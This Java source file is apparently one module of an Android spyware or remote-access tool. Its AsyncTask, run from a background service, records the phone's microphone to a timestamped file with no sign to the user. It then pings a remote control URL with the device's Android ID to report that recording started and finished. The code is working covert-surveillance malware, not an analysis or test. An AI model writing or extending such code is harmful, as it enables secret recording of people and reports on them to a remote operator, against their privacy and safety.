package u.can.i.up.expert.utils;

import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Date;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class recordAudio extends AsyncTask<String, Void, String> {
    String i = "0";
    public recordAudio(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
        MediaRecorder recorder = new MediaRecorder();;

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
        String currentDateandTime = sdf.format(new Date());

        String filename =currentDateandTime + ".3gp";

        File diretory = new File(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("File", "") + File.separator + "Audio");
        diretory.mkdirs();
        File outputFile = new File(diretory, filename);

        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setMaxDuration(Integer.parseInt(i));
        recorder.setMaxFileSize(1000000);
        recorder.setOutputFile(outputFile.toString());

        try
        {
            recorder.prepare();
            recorder.start();
        } catch (IOException e) {
            Log.i("com.connect", "io problems while preparing");
            e.printStackTrace();
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {

        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        try {
            Thread.sleep(Integer.parseInt(i)+2500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Media",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Recording Audio Complete");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {

        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Media",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Media",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {}
}
